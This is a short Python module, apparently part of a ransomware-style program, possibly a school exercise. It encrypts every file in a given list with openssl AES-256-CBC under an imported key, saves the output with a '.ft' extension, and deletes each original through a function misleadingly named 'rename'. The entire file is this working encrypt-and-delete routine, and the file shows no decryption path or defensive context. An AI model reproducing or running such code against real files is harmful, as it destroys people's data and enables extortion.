from utilities import *
import subprocess
import os

def rename(path):
    os.remove(path)

def do_encode(path):
    command = [
        "openssl",
        "enc",
        "-aes-256-cbc",
        "-pbkdf2",
        "-in", path,
        "-out", path + ".ft", 
        "-k", key
    ]
    try:
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError:
        exit_error("Opensll error during encoding")
    prints(f"{path}: encoded")

def encode(lst: list):
    been_encoded = 0
    prints('\nStart encoding:')
    for file in lst:
        root, extension = os.path.splitext(file)
        if extension == ".ft":
            continue
        been_encoded += 1 
        do_encode(file.path)
        rename(file.path)
    if not been_encoded:
        prints("\tNo file to encode")